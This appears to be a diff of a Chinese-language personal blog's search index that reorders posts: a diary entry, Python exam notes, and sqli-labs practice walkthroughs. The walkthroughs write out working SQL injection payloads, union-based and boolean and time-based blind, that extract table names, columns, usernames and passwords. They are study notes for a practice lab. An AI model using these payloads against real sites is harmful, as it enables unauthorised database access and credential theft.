@@ -56,6 +56,28 @@
       </tags>
   </entry>
   <entry>
+    <title>也无风雨也无晴</title>
+    <url>/2022/11/07/Diary_1107/</url>
+    <content><![CDATA[<p><img src="/images/violet--7.png" alt="violet"></p>
+<span id="more"></span>
+
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>回首向来萧瑟处，归去。也无风雨也无晴。</p>
+<h1 id="没啥感受的一天"><a href="#没啥感受的一天" class="headerlink" title="没啥感受的一天"></a>没啥感受的一天</h1><p>诗是开始写这篇日志的时候才想起的。挺不错，一语双关咯。既形容了今天的天气，也形容了今天的感受。</p>
+<p>上午早上八点的课，让人十分难以起床，毕竟晚上只睡了6h不到，起来后又不想用冷水洗脸，因为感冒。起得晚果不其然上课迟到了，虽然我不在意。</p>
+<p>午餐时间身边一人向我倾诉一些关于友人与家庭的琐事，让我觉得人间之事真麻烦呀。我想我现在这样就够了。</p>
+<p>下午一直在上课，午觉也只睡了半小时。第一节是《网络安全服务与管理》，去了之后发现这门课都没什么用。干脆下次不去了吧。</p>
+<p>晚上重温了下sql语句，毕竟以前学的都忘光了。书还没看完就睡了，实在困。睡了大概两三个小时，起来学了点sql注入，一天便这样结束了。</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这次好像还是写了20分钟，还是太久，争取缩短到10分钟以内。以后只说关注的事。</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>夫天地者，万物之逆旅也</title>
     <url>/2022/11/08/Diary_1108/</url>
     <content><![CDATA[<p><img src="/images/violet--6.png" alt="violet"></p>
@@ -77,6 +99,8 @@
     <title>Python期末专题</title>
     <url>/2022/11/13/Python%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当撰写这篇Python复习专题的时候，距离期末考试仅剩3天。<br>我啊，真是堕落。&#x2F;(ㄒoㄒ)&#x2F;~~<br>本篇复习主要以两次测试以及题库为主，其它作为补充。</p>
+<span id="more"></span>
+
 <h1 id="概念题"><a href="#概念题" class="headerlink" title="概念题"></a>概念题</h1><ol>
 <li>id()函数</li>
 </ol>
@@ -102,7 +126,7 @@
 </ol>
 <ul>
 <li>单行注释 #</li>
-<li>多行注释(不一定是注释，有时可作为字符串存在)<br>单引号 ‘’’<br>双引号 “””</li>
+<li>多行注释(不一定是注释，有时可作为字符串存在)<br>单引号 <code>&#39;&#39;&#39;</code><br>双引号 <code>&quot;&quot;&quot;</code></li>
 </ul>
 <ol start="6">
 <li><p>Python 变量名区分大小写<br>例如：Cuit和cuit是两个变量名</p>
@@ -259,28 +283,6 @@
       </categories>
       <tags>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>也无风雨也无晴</title>
-    <url>/2022/11/07/Diary_1107/</url>
-    <content><![CDATA[<p><img src="/images/violet--7.png" alt="violet"></p>
-<span id="more"></span>
-
-<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>回首向来萧瑟处，归去。也无风雨也无晴。</p>
-<h1 id="没啥感受的一天"><a href="#没啥感受的一天" class="headerlink" title="没啥感受的一天"></a>没啥感受的一天</h1><p>诗是开始写这篇日志的时候才想起的。挺不错，一语双关咯。既形容了今天的天气，也形容了今天的感受。</p>
-<p>上午早上八点的课，让人十分难以起床，毕竟晚上只睡了6h不到，起来后又不想用冷水洗脸，因为感冒。起得晚果不其然上课迟到了，虽然我不在意。</p>
-<p>午餐时间身边一人向我倾诉一些关于友人与家庭的琐事，让我觉得人间之事真麻烦呀。我想我现在这样就够了。</p>
-<p>下午一直在上课，午觉也只睡了半小时。第一节是《网络安全服务与管理》，去了之后发现这门课都没什么用。干脆下次不去了吧。</p>
-<p>晚上重温了下sql语句，毕竟以前学的都忘光了。书还没看完就睡了，实在困。睡了大概两三个小时，起来学了点sql注入，一天便这样结束了。</p>
-<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这次好像还是写了20分钟，还是太久，争取缩短到10分钟以内。以后只说关注的事。</p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-        <tag>生活</tag>
       </tags>
   </entry>
   <entry>
@@ -507,6 +509,40 @@
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_13+14+15+16</title>
+    <url>/2022/11/10/sqli-labs_13-16/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识都是前面已经出现过的，只是提交方式不同，没什么难度。</p>
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure>
+<p>构造成功，然后使用时间盲注</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure>
+<p>以此类推</p>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="第14关差不多，只是构造方式变成了双引号"><a href="#第14关差不多，只是构造方式变成了双引号" class="headerlink" title="第14关差不多，只是构造方式变成了双引号"></a>第14关差不多，只是构造方式变成了双引号</h2><h2 id="第15关和第11关差不多"><a href="#第15关和第11关差不多" class="headerlink" title="第15关和第11关差不多"></a>第15关和第11关差不多</h2><h2 id="第16关和第12关差不多"><a href="#第16关和第12关差不多" class="headerlink" title="第16关和第12关差不多"></a>第16关和第12关差不多</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有手就行</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_17</title>
     <url>/2022/11/11/sqli-labs_17/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始有了新变化，是一个更新密码的页面，这说明已经成功进入了系统，接下来就看看如何解决吧。</p>
@@ -546,6 +582,42 @@
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_4</title>
+    <url>/2022/11/08/sqli-labs_4/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p>
+</li>
+<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
+<ol start="3">
+<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
+<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
+<li>此笔记为笔者初学sql注入时所写</li>
+<li>本关重点在于通过报错信息判断sql语句，注意sql语句的构造情况</li>
+</ul>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_3</title>
     <url>/2022/11/08/sqli-labs_3/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
@@ -571,40 +643,6 @@
 <li>本关重点在于通过报错信息判断sql语句</li>
 </ul>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs_13+14+15+16</title>
-    <url>/2022/11/10/sqli-labs_13-16/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识都是前面已经出现过的，只是提交方式不同，没什么难度。</p>
-<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure>
-<p>构造成功，然后使用时间盲注</p>
-</li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure>
-<p>以此类推</p>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第14关差不多，只是构造方式变成了双引号"><a href="#第14关差不多，只是构造方式变成了双引号" class="headerlink" title="第14关差不多，只是构造方式变成了双引号"></a>第14关差不多，只是构造方式变成了双引号</h2><h2 id="第15关和第11关差不多"><a href="#第15关和第11关差不多" class="headerlink" title="第15关和第11关差不多"></a>第15关和第11关差不多</h2><h2 id="第16关和第12关差不多"><a href="#第16关和第12关差不多" class="headerlink" title="第16关和第12关差不多"></a>第16关和第12关差不多</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有手就行</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -662,31 +700,39 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_4</title>
-    <url>/2022/11/08/sqli-labs_4/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p>
+    <title>sqli-labs_8</title>
+    <url>/2022/11/09/sqli-labs_8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第八关页面只能显示对错，而没有任何其它信息，因此我们可以使用布尔盲注和时间盲注。这里主要来讲讲用<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>如何完成的。</p>
 <span id="more"></span>
 
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p>
 </li>
-<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+</li>
 </ol>
-<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
-<ol start="3">
-<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
-<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
-<li>此笔记为笔者初学sql注入时所写</li>
-<li>本关重点在于通过报错信息判断sql语句，注意sql语句的构造情况</li>
+<ul>
+<li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>
+说明数据库名长度为8</li>
+<li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>
+说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li>
 </ul>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+<ol start="3">
+<li><p><strong>爆表</strong><br>道理是类似的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p>
+</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>手动进行布尔注入或时间注入很麻烦，我们只需要理解并记住其原理步骤即可</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/FourthGuy/article/details/108984045">sqli-labs-master第八关</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -753,39 +799,35 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_8</title>
-    <url>/2022/11/09/sqli-labs_8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第八关页面只能显示对错，而没有任何其它信息，因此我们可以使用布尔盲注和时间盲注。这里主要来讲讲用<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>如何完成的。</p>
+    <title>sqli-labs_9+10</title>
+    <url>/2022/11/09/sqli-labs_9+10/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第九关既不能显示正确，也不会显示错误。因此不能使用布尔盲注，只能使用<a href="https://truthnian.github.io/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a>。</p>
 <span id="more"></span>
 
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p>
 </li>
 <li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure>
+<p>说明数据库名长度是8个字符<br>版本号以此类推</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure>
+<p>最终尝试完后可得数据库名是security</p>
 </li>
-</ol>
-<ul>
-<li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>
-说明数据库名长度为8</li>
-<li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>
-说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li>
-</ul>
-<ol start="3">
-<li><p><strong>爆表</strong><br>道理是类似的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure>
-<p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure>
+<p>最终尝试完后可得所需表名为users</p>
 </li>
 <li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure>
-<p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure>
+<p>最终出现了我们所需的字段名username, password</p>
 </li>
 <li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure>
-<p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure>
+<p>最终得到了所需的数据</p>
 </li>
 </ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>手动进行布尔注入或时间注入很麻烦，我们只需要理解并记住其原理步骤即可</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/FourthGuy/article/details/108984045">sqli-labs-master第八关</a></p>
+<h2 id="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"><a href="#第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号" class="headerlink" title="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"></a>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我终于知道为什么别人写博客，有些关会写得相当简略了，因为都是一样的，确实没意思…</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -1036,46 +1078,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs_9+10</title>
-    <url>/2022/11/09/sqli-labs_9+10/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第九关既不能显示正确，也不会显示错误。因此不能使用布尔盲注，只能使用<a href="https://truthnian.github.io/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a>。</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
